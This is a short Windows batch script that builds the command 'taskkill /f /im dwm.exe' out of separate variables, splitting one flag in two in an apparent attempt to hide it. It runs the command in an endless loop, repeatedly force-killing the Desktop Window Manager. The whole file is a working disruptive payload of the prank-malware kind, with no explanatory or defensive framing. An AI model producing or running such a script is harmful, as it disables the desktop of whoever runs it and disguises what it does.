@echo off
setlocal
set cmd1=taskkill
set "flag1=/f"
set "flag2p=/i"
set "flag2p2=m"
set "proc=dwm.exe"
:a
%cmd1% %flag1% %flag2p%%flag2p2% %proc%
goto a
